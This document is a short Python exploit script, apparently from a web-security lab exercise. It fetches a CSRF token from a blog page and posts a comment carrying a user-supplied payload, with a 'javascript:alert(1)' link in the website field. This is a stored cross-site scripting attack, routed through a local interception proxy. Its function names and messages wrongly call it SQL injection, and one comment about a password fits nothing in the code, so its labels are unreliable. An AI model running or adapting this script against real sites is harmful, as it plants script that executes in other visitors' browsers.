import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# get csrf 
def get_csrf(s, url):
    uri = "?postId=5"
    print("[+] Inside Get CSRF")
    r = s.get(url+uri, verify=False, proxies=proxies)
    # get from the session
    soup = BeautifulSoup(r.text, 'html.parser')
    # find csrf from input tag
    csrf = soup.find("input")['value']
    print("[+] SQL CSRF:"+str(csrf))
    return csrf    


def exploit_sql(s,url,comment):
    uri = "/comment"
    print("[+] Inside Expolit Sqli")
    csrf = get_csrf(s, url)
    print(csrf)
    # data is needed to authenticate the user
    # password can be random because it is commented
    data = {"csrf": csrf,
            "postId":"2",
            "comment": comment,
            "name":"swati",
            "email":"swati@gmail.com",
            "website":"javascript:alert(1)"}
    r = s.post(url+uri, data=data, verify=False, proxies=proxies)


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        comment = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s css alert' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    csrf = get_csrf(s,url)
    exploit_sql(s,url,comment)